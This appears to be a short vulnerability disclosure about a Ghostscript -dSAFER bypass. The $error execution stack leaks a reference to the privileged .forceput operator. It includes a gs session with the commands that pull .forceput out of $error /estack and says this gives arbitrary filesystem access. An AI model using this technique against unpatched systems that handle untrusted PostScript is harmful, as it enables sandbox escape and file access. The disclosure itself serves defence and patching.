There are a whole bunch of different stacks in postscript, there's the operand stack, the dict stack, the execution stack, and so on.  When the error handler is invoked in postscript, part of the execution context is passed to the handler so that it can examine what went wrong. That context is called `$error`, and could have included parts of executeonly routines, and therefore could leak references to system operators.  $ gs -dSAFER -sDEVICE=ppmraw GS>{ null .setglobal } stopped clear GS>$error /estack get == [...  {-dict- /FontDirectory --.currentglobal-- {-dict-} {/LocalFontDirectory --.systemvar--} --ifelse-- --.forceput-- --pop--}]  Notice the .forceput in there...  GS>$error /estack get 29 get == {-dict- /FontDirectory --.currentglobal-- {-dict-} {/LocalFontDirectory --.systemvar--} --ifelse-- --.forceput-- --pop--} GS>$error /estack get 29 get 6 get == --.forceput-- GS>  Once you have a reference to forceput, you can do anything you like, see the exploit for as an example of abusing forceput to get arbitrary filesystem access.  The fix is public now, this is the commit to fix it:   This was ghostscript bug  Thanks, Tavis.
